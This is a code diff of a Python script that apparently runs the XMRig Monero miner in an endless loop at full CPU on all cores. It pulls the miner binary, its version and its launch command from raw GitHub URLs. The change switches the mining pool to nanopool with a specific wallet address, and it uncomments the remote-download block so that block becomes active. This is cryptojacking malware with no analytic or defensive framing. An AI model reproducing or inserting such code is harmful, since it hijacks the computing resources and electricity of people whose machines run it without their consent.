@@ -35,8 +35,8 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
-#command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
+command_xmrig_default = '-o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg -p nql --tls -t %s --cpu-max-threads-hint=100' %cores
+#command_xmrig_default = '-o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg --cpu-max-threads-hint=100'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
@@ -80,7 +80,7 @@ while True:
             pass
         #print('So cores de dao la %s' %cores)
         #xmr
-        '''
+        
         link_version_xmrig = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/daonhanh/version_xmrig'
         link_download_xmrig = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/daonhanh/xmrig_linux.gz'
         link_command_xmrig = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/daonhanh/command_xmrig'
